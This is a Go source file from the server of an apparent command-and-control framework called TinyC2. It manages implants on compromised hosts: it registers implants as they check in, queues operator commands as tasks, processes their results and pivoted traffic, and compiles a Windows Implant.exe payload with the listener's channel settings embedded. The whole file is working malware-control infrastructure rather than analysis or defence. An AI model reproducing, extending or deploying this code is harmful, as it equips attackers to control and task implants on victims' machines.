package implant

import (
	"encoding/json"
	"errors"
	"fmt"
	"hash/crc32"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/0xPrimo/TinyC2/server/internal/database"
	"github.com/0xPrimo/TinyC2/server/internal/listener"
	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"
	"github.com/0xPrimo/TinyC2/server/internal/pkg/store"
)

type Manager struct {
	implants *store.Store[string, *Implant]
	commands *store.Store[string, Command]
	db       *database.Database
	listener.IListenerManager
}

func NewManager(db *database.Database, listenerManager listener.IListenerManager) *Manager {
	manager := &Manager{
		implants:         store.NewStore[string, *Implant](),
		commands:         store.NewStore[string, Command](),
		db:               db,
		IListenerManager: listenerManager,
	}

	manager.registerCommands()

	return manager
}

func (m *Manager) ImplantDBSync() error {
	var errs []error

	implants, err := m.db.ImplantGetAll()
	if err != nil {
		return err
	}

	for _, meta := range implants {
		implant, err := m.createImplant(meta.ID, meta.Meta)
		if err != nil {
			errs = append(errs, fmt.Errorf("failed to create implant: %v", err))
			continue
		}

		for _, ch := range meta.Channels {
			implant.ChannelAdd(ch.Name, &Channel{
				Name:     ch.Name,
				Fallback: ch.Fallback,
				InUse:    ch.InUse,
			})
		}
	}

	return errors.Join(errs...)

}

func (m *Manager) ImplantExecute(id string, name string, args ...string) error {
	// does implant exists
	implant, ok := m.implants.Get(id)
	if !ok {
		return fmt.Errorf("implant not found with id: %s", id)
	}

	cmd, ok := m.commands.Get(name)
	if !ok {
		return fmt.Errorf("command not found: %s", name)
	}

	if len(args)-1 < cmd.NumberOfArguments {
		return fmt.Errorf("invalid number of arguments: expected %d, got %d", cmd.NumberOfArguments, len(args)-1)
	}

	task, err := cmd.execute(m, id, args...)
	if err != nil {
		return err
	}

	// add task to implant queue
	implant.TaskAdd(task)

	return nil
}

func (m *Manager) ImplantProcess(listener string, data []byte) ([]byte, error) {
	packet, err := m.parse(data)
	if err != nil {
		return nil, err
	}

	// register implant if not
	implant, ok := m.implants.Get(packet.ID)
	if !ok {
		return m.register(packet.ID, listener, packet.TaskResult)
	}

	// update timer
	implant.TimerUpdate()

	// handle implant task result
	for _, result := range packet.TaskResult {
		cmd, ok := m.commands.Get(result.Cmd)
		if !ok {
			logger.Error("command not found: %s", result.Cmd)
			continue
		}

		cmd.process(m, packet.ID, result)
	}

	return m.response(packet.ID)
}

func (m *Manager) ImplantGenerate(listenerName string) ([]byte, error) {
	extension, err := m.ListenerExtension(listenerName)
	if err != nil {
		return nil, err
	}

	src, _ := filepath.Abs("../implant")

	//os.WriteFile("/home/primo/NetShare/Implant/Implant/include/Config_"+listenerName+".h", []byte("#define CHANNEL_DEFAULT "+toCArray(extension)+"\n"), 0644)
	//
	//return nil, fmt.Errorf("implant debug mode")

	binary, err := buildCmakeProject(src, extension)
	if err != nil {
		return nil, err
	}

	return binary, nil
}

func (m *Manager) ImplantExists(id string) bool {
	_, ok := m.implants.Get(id)
	return ok
}

func (m *Manager) ImplantList() []Implant {
	var implants []Implant
	m.implants.ForEach(func(id string, implant *Implant) {
		implants = append(implants, *implant)
	})
	return implants
}

func (m *Manager) ImplantCommandList() []Command {
	return CommandList
}

func (m *Manager) ImplantChannelList(id string) ([]Channel, bool) {
	var channels []Channel

	implant, ok := m.implants.Get(id)
	if !ok {
		return channels, false
	}

	return implant.ChannelList(), true
}

// pivot
func (m *Manager) pivot(data []byte) {
	resp, err := m.parse(data)
	if err != nil {
		logger.Error("%v", err)
		return
	}

	for _, result := range resp.TaskResult {
		cmd, ok := m.commands.Get(result.Cmd)
		if !ok {
			logger.Error("command not found: %s", result.Cmd)
			continue
		}

		cmd.process(m, resp.ID, result)
	}
}

// response
func (m *Manager) response(id string) ([]byte, error) {
	implant, ok := m.implants.Get(id)
	if !ok {
		return nil, fmt.Errorf("implant with id %s not found", id)
	}

	return m.pack(implant.TaskPopAll())
}

func (m *Manager) createImplant(id string, checkin map[string]any) (*Implant, error) {
	implant := NewImplant(id, checkin)
	m.implants.Set(id, implant)
	return implant, nil
}

// register
func (m *Manager) register(id string, listener string, results []TaskResult) ([]byte, error) {
	var checkin map[string]any

	if len(results) == 0 {
		return nil, fmt.Errorf("implant response packet doesn't have task result")
	}

	err := json.Unmarshal(results[0].Artifact, &checkin)
	if err != nil {
		return nil, err
	}

	implant, err := m.createImplant(id, checkin)
	if err != nil {
		return nil, err
	}

	implant.ChannelAdd(listener, &Channel{
		ID:       crc32.ChecksumIEEE([]byte(listener)),
		Name:     listener,
		Fallback: true,
		InUse:    true,
	})

	// save implant to database
	err = m.db.ImplantCreate(id, map[string]any{
		"id":       crc32.ChecksumIEEE([]byte(listener)),
		"name":     listener,
		"fallback": true,
		"in-use":   true,
	}, implant.Meta)

	if err != nil {
		logger.Error("%v", err)
	}

	magic := map[string]any{
		"magic": "baadf00d",
	}

	data, err := json.Marshal(magic)
	if err != nil {
		return nil, err
	}

	return data, nil
}

// parse
func (m *Manager) parse(data []byte) (Packet, error) {
	var raw rawPacket
	if err := json.Unmarshal(data, &raw); err != nil {
		return Packet{}, fmt.Errorf("unmarshal packet: %w", err)
	}

	// Validate required fields
	if raw.ID == nil {
		return Packet{}, errors.New("invalid packet: missing id")
	}

	// Scalable: Pre-allocate slice capacity to handle 0, 1, or N tasks efficiently
	results := make([]TaskResult, 0, len(raw.Tasks))
	for _, t := range raw.Tasks {
		results = append(results, TaskResult{
			Cmd:      t.Name,
			Status:   t.Status,
			Output:   t.Output,
			Artifact: []byte(t.Artifact),
		})
	}

	return Packet{
		ID:         strconv.FormatUint(*raw.ID, 16),
		TaskResult: results,
	}, nil

}

// pack
func (m *Manager) pack(tasks []Task) ([]byte, error) {

	var (
		packet []any
	)

	for _, task := range tasks {
		t := map[string]any{
			"name":     task.Cmd,
			"args":     task.Args,
			"artifact": string(task.Artifact),
		}

		packet = append(packet, t)
	}

	data, err := json.Marshal(packet)
	if err != nil {
		return nil, err
	}

	return data, nil
}

// registerCommands
func (m *Manager) registerCommands() {
	for _, cmd := range CommandList {
		m.commands.Set(cmd.Name, cmd)
	}
}

// build implant payload
func buildCmakeProject(src string, extension []byte) ([]byte, error) {
	os.MkdirAll(src+"/build", 0o755)

	args := []string{
		"-S", src,
		"-B", src + "/build",
		"-DDEFAULT_CHANNEL=" + toCArray(extension),
	}

	cmd := exec.Command("cmake", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		logger.Error("configuration failed: %v", err)
		return nil, err
	}

	args = []string{"--build", src + "/build"}
	cmd = exec.Command("cmake", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		logger.Error("configuration failed: %v", err)
		return nil, err
	}

	data, err := os.ReadFile(src + "/build/Implant.exe")
	if err != nil {
		return nil, fmt.Errorf("failed to read implant exe: %w", err)
	}

	return data, nil
}

func toCArray(data []byte) string {
	bytes := make([]string, len(data)+1)

	for i, b := range data {
		bytes[i] = fmt.Sprintf("0x%02x", b)
	}

	return "{" + strings.Join(bytes, ", ") + "}"
}
